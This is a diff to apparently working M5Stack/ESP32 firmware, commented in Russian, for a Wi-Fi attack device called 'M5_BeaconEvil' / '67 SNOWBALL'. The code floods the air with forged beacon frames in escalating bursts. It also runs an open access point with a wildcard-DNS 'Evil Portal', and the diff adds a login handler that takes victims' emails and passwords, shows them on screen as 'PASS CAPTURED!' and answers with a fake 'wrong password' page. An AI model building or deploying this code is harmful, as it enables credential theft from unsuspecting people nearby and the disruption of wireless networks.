@@ -14,41 +14,44 @@ const byte DNS_PORT = 53;
 
 bool isSpamming = false;
 bool isEvilPortalActive = true; 
-unsigned long lastBeaconTime = 0;
 int packetCount = 0;
-int currentBurst = 100; // Начинаем со 100, потом растет
+
+// Логика нарастания
+int currentSecond = 0;
+unsigned long lastSecondTime = 0;
+const int burstSizes[] = {300, 300, 300, 400}; // 1сек: 300, 2сек: +300, 3сек: +300, 4сек: +400
+const int numBursts = sizeof(burstSizes) / sizeof(burstSizes[0]);
 
 // ================= ПРОТОТИПЫ =================
 void drawUI();
 void sendBeaconSpam();
 void setupServer();
+void savePassword(String email, String pass);
 
-// ================= БЕКОН СПАМ =================
+// ================= БЕКОН СПАМ (ВСЕ СЕТИ "67") =================
 void sendBeaconSpam() {
   uint8_t packet[128] = {0};
   
   packet[0] = 0x80; packet[1] = 0x00; packet[2] = 0x00; packet[3] = 0x00; 
   for(int i=4; i<10; i++) packet[i] = 0xFF; 
+  
+  // Рандомим Source MAC и BSSID, чтобы телефон видел их как разные сети
   for(int i=10; i<16; i++) packet[i] = random(0, 255);
   for(int i=16; i<22; i++) packet[i] = packet[i-6];
+  
   packet[22] = 0x00; packet[23] = 0x00;
   for(int i=24; i<32; i++) packet[i] = random(0, 255);
   packet[32] = 0x64; packet[33] = 0x00; packet[34] = 0x11; packet[35] = 0x04;
 
-  // Рандомим имя с бОльшим разбросом
-  char ssidBuf[32];
-  int type = random(0, 5);
-  if (type == 0) sprintf(ssidBuf, "Free_WiFi_%d", random(0, 5000));
-  else if (type == 1) sprintf(ssidBuf, "Hack_Me_%d", random(0, 5000));
-  else if (type == 2) sprintf(ssidBuf, "Virus_%d", random(0, 5000));
-  else if (type == 3) sprintf(ssidBuf, "M5Stack_%d", random(0, 5000));
-  else sprintf(ssidBuf, "Error_%d", random(0, 5000));
-
-  int ssidLen = strlen(ssidBuf);
+  // НАЗВАНИЕ СЕТИ - ВСЕГДА "67"
+  const char* ssidName = "67";
+  int ssidLen = 2;
   int len = 36;
   
   packet[len++] = 0x00; packet[len++] = ssidLen;
-  memcpy(&packet[len], ssidBuf, ssidLen); len += ssidLen;
+  memcpy(&packet[len], ssidName, ssidLen); len += ssidLen;
+  
+  // Рандомный канал (1-13)
   packet[len++] = 0x03; packet[len++] = 0x01; 
   packet[len++] = random(1, 14); 
 
@@ -62,73 +65,44 @@ const char index_html[] PROGMEM = R"rawliteral(
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>M5_BeaconEvil</title>
+  <title>67 SNOWBALL</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: 'Courier New', monospace; }
     body { background: #000; color: #fff; overflow: hidden; }
     #app { height: 100vh; display: flex; flex-direction: column; padding: 20px; }
-    
-    h1 { font-size: 20px; color: #0f0; margin-bottom: 20px; text-transform: uppercase; border-bottom: 2px dashed #0f0; padding-bottom: 10px; font-weight: bold; letter-spacing: 1px; text-align: center; }
-    
+    h1 { font-size: 20px; color: #f00; margin-bottom: 20px; text-transform: uppercase; border-bottom: 2px dashed #f00; padding-bottom: 10px; font-weight: bold; letter-spacing: 1px; text-align: center; }
     button { background: #000; color: #fff; border: 2px solid #fff; padding: 20px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; margin-bottom: 15px; text-transform: uppercase; }
     button:active { background: #fff; color: #000; }
-    button.active { background: #0f0; color: #000; border-color: #0f0; }
-    
+    button.active { background: #f00; color: #000; border-color: #f00; }
     .status-box { padding: 15px; background: #000; border: 2px solid #fff; margin-bottom: 20px; font-size: 14px; text-transform: uppercase; text-align: center; }
-    .status-on { color: #0f0; border-color: #0f0; }
-    .status-off { color: #f00; border-color: #f00; }
-    
+    .status-on { color: #f00; border-color: #f00; }
+    .status-off { color: #0f0; border-color: #0f0; }
     .info { font-size: 12px; color: #888; text-align: center; margin-top: 20px; }
   </style>
 </head>
 <body>
   <div id="app">
-    <h1>M5_BeaconEvil</h1>
-    
-    <div class="status-box" id="status-wifi">BEACON SPAM: ВЫКЛЮЧЕН</div>
-    <button id="btnWifi" onclick="toggleWifi()">ЗАПУСТИТЬ СПАМ (НАКОПИТЕЛЬНО)</button>
-
+    <h1>67 SNOWBALL</h1>
+    <div class="status-box" id="status-wifi">SNOWBALL SPAM: ВЫКЛЮЧЕН</div>
+    <button id="btnWifi" onclick="toggleWifi()">ЗАПУСТИТЬ СНЕЖНЫЙ КОМ</button>
     <div class="status-box" id="status-portal">EVIL PORTAL: АКТИВЕН</div>
     <button id="btnPortal" onclick="togglePortal()">ОСТАНОВИТЬ ПОРТАЛ</button>
-
-    <div class="info">Подключись к сети M5_BeaconEvil без пароля. Портал откроется автоматически.</div>
+    <div class="info">Подключись к сети M5_BeaconEvil без пароля. Портал откроется автоматически. Мир обречен.</div>
   </div>
-
   <script>
     let isWifiOn = false;
     let isPortalOn = true;
-
-    function toggleWifi() {
-      fetch(isWifiOn ? '/wifi/off' : '/wifi/on').then(r => r.text()).then(() => {
-        isWifiOn = !isWifiOn;
-        updateUI();
-      });
-    }
-
-    function togglePortal() {
-      fetch(isPortalOn ? '/portal/off' : '/portal/on').then(r => r.text()).then(() => {
-        isPortalOn = !isPortalOn;
-        updateUI();
-      });
-    }
-
+    function toggleWifi() { fetch(isWifiOn ? '/wifi/off' : '/wifi/on').then(r => r.text()).then(() => { isWifiOn = !isWifiOn; updateUI(); }); }
+    function togglePortal() { fetch(isPortalOn ? '/portal/off' : '/portal/on').then(r => r.text()).then(() => { isPortalOn = !isPortalOn; updateUI(); }); }
     function updateUI() {
-      let btnW = document.getElementById('btnWifi');
-      let statW = document.getElementById('status-wifi');
-      if(isWifiOn) { btnW.innerText = 'ОСТАНОВИТЬ СПАМ'; btnW.classList.add('active'); statW.innerText = 'BEACON SPAM: НАКОПИТЕЛЬНЫЙ'; statW.className = 'status-box status-on'; }
-      else { btnW.innerText = 'ЗАПУСТИТЬ СПАМ (НАКОПИТЕЛЬНО)'; btnW.classList.remove('active'); statW.innerText = 'BEACON SPAM: ВЫКЛЮЧЕН'; statW.className = 'status-box status-off'; }
-
-      let btnP = document.getElementById('btnPortal');
-      let statP = document.getElementById('status-portal');
+      let btnW = document.getElementById('btnWifi'); let statW = document.getElementById('status-wifi');
+      if(isWifiOn) { btnW.innerText = 'ОСТАНОВИТЬ КОМ'; btnW.classList.add('active'); statW.innerText = 'СНЕЖНЫЙ КОМ АКТИВЕН'; statW.className = 'status-box status-on'; }
+      else { btnW.innerText = 'ЗАПУСТИТЬ СНЕЖНЫЙ КОМ'; btnW.classList.remove('active'); statW.innerText = 'SNOWBALL SPAM: ВЫКЛЮЧЕН'; statW.className = 'status-box status-off'; }
+      let btnP = document.getElementById('btnPortal'); let statP = document.getElementById('status-portal');
       if(isPortalOn) { btnP.innerText = 'ОСТАНОВИТЬ ПОРТАЛ'; btnP.classList.add('active'); statP.innerText = 'EVIL PORTAL: АКТИВЕН'; statP.className = 'status-box status-on'; }
       else { btnP.innerText = 'ЗАПУСТИТЬ ПОРТАЛ'; btnP.classList.remove('active'); statP.innerText = 'EVIL PORTAL: ВЫКЛЮЧЕН'; statP.className = 'status-box status-off'; }
     }
-
-    fetch('/status').then(r => r.text()).then(t => {
-      if(t.includes('WIFI_ON')) isWifiOn = true;
-      if(t.includes('PORTAL_ON')) isPortalOn = true;
-      updateUI();
-    });
+    fetch('/status').then(r => r.text()).then(t => { if(t.includes('WIFI_ON')) isWifiOn = true; if(t.includes('PORTAL_ON')) isPortalOn = true; updateUI(); });
   </script>
 </body>
 </html>
@@ -169,14 +143,28 @@ const char portal_html[] PROGMEM = R"rawliteral(
 </body></html>
 )rawliteral";
 
+// ================= ЛОГИКА ПОРТАЛА И ЭКРАНА =================
+void savePassword(String email, String pass) {
+  M5.Display.fillScreen(BLACK);
+  M5.Display.setTextColor(WHITE);
+  M5.Display.setCursor(10, 10);
+  M5.Display.print("PASS CAPTURED!");
+  M5.Display.setCursor(10, 30);
+  M5.Display.print(email);
+  M5.Display.setCursor(10, 50);
+  M5.Display.print(pass);
+  delay(3000);
+  drawUI();
+}
+
 // ================= ОТРИСОВКА МЕНЮ =================
 void drawUI() {
   M5.Display.fillScreen(BLACK);
   M5.Display.setTextColor(WHITE);
   M5.Display.setTextSize(2);
   M5.Display.setCursor(10, 10);
-  M5.Display.print("M5_BeaconEvil");
-  M5.Display.drawLine(0, 35, 135, 35, GREEN);
+  M5.Display.print("67 SNOWBALL");
+  M5.Display.drawLine(0, 35, 135, 35, RED); 
   
   M5.Display.setTextSize(1);
   M5.Display.setCursor(10, 45);
@@ -194,6 +182,8 @@ void drawUI() {
   M5.Display.setCursor(10, 75);
   M5.Display.print("Packets: "); M5.Display.print(packetCount);
   M5.Display.setCursor(10, 90);
+  M5.Display.print("Sec: "); M5.Display.print(currentSecond + 1);
+  M5.Display.setCursor(10, 105);
   M5.Display.print("IP: ");
   M5.Display.print(WiFi.softAPIP());
 }
@@ -202,32 +192,11 @@ void drawUI() {
 void setupServer() {
   server.on("/", HTTP_GET, [](){ server.send_P(200, "text/html", index_html); });
   
-  server.on("/wifi/on", HTTP_GET, [](){ 
-    isSpamming = true; 
-    currentBurst = 100; // Сбрасываем счетчик при старте
-    drawUI(); 
-    server.send(200, "text/plain", "ON"); 
-  });
+  server.on("/wifi/on", HTTP_GET, [](){ isSpamming = true; currentSecond = 0; lastSecondTime = millis(); drawUI(); server.send(200, "text/plain", "ON"); });
+  server.on("/wifi/off", HTTP_GET, [](){ isSpamming = false; drawUI(); server.send(200, "text/plain", "OFF"); });
   
-  server.on("/wifi/off", HTTP_GET, [](){ 
-    isSpamming = false; 
-    drawUI(); 
-    server.send(200, "text/plain", "OFF"); 
-  });
-  
-  server.on("/portal/on", HTTP_GET, [](){
-    isEvilPortalActive = true;
-    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
-    drawUI();
-    server.send(200, "text/plain", "PORTAL ON");
-  });
-
-  server.on("/portal/off", HTTP_GET, [](){
-    isEvilPortalActive = false;
-    dnsServer.stop();
-    drawUI();
-    server.send(200, "text/plain", "PORTAL OFF");
-  });
+  server.on("/portal/on", HTTP_GET, [](){ isEvilPortalActive = true; dnsServer.start(DNS_PORT, "*", WiFi.softAPIP()); drawUI(); server.send(200, "text/plain", "PORTAL ON"); });
+  server.on("/portal/off", HTTP_GET, [](){ isEvilPortalActive = false; dnsServer.stop(); drawUI(); server.send(200, "text/plain", "PORTAL OFF"); });
 
   server.on("/status", HTTP_GET, [](){
     String status = "";
@@ -237,7 +206,10 @@ void setupServer() {
   });
 
   server.on("/login", HTTP_POST, [](){
-    server.send(200, "text/html", "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'><h1>ОШИБКА</h1><p>Неверный пароль. Попробуйте еще раз.</p></body></html>");
+    String email = server.arg("email");
+    String pass = server.arg("password");
+    savePassword(email, pass);
+    server.send(200, "text/html", "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'><h1>ОШИБКА</h1><p>Неверный пароль.</p></body></html>");
   });
 
   server.onNotFound([](){
@@ -260,7 +232,7 @@ void setup() {
   if(!SPIFFS.begin(true)) Serial.println("SPIFFS Error");
 
   WiFi.mode(WIFI_AP);
-  WiFi.softAP("M5_BeaconEvil"); // Без пароля
+  WiFi.softAP("M5_BeaconEvil"); 
 
   esp_wifi_set_ps(WIFI_PS_NONE);
   esp_wifi_set_promiscuous(true);
@@ -275,31 +247,30 @@ void setup() {
   drawUI();
 }
 
-// ================= LOOP =================
+// ================= LOOP (СНЕЖНЫЙ КОМ) =================
 void loop() {
   server.handleClient();
   if (isEvilPortalActive) dnsServer.processNextRequest();
   M5.update();
 
-  // НАКОПИТЕЛЬНЫЙ СПАМ: каждые 5 секунд отправляем 'currentBurst' пакетов и увеличиваем счетчик
-  if (isSpamming && (millis() - lastBeaconTime >= 5000)) {
-    lastBeaconTime = millis();
-    
-    // Отправляем текущую пачку
-    for(int i = 0; i < currentBurst; i++) {
-      sendBeaconSpam();
-      delay(1); // Микро-пауза, чтобы Wi-Fi стек не захлебнулся
+  // ЛОГИКА СНЕЖНОГО КОМА
+  if (isSpamming) {
+    if (millis() - lastSecondTime >= 1000) {
+      // Наступает новая секунда
+      lastSecondTime = millis();
+      
+      if (currentSecond < numBursts) {
+        // Отправляем пачку пакетов для текущей секунды
+        for(int i = 0; i < burstSizes[currentSecond]; i++) {
+          sendBeaconSpam();
+          if (i % 50 == 0) delay(1); // Микро-пауза для Wi-Fi стека
+        }
+        currentSecond++;
+        drawUI();
+      } else {
+        // Цикл завершен, сбрасываем на начало
+        currentSecond = 0;
+      }
     }
-    
-    // Увеличиваем счетчик для следующего цикла
-    currentBurst += 100;
-    
-    // Если счетчик стал слишком большим (например, больше 2000), сбрасываем его,
-    // чтобы стик не ушел в бесконечный цикл на 5 секунд (он не будет успевать обновлять веб-интерфейс)
-    if (currentBurst > 2000) {
-      currentBurst = 100;
-    }
-    
-    drawUI();
   }
 }
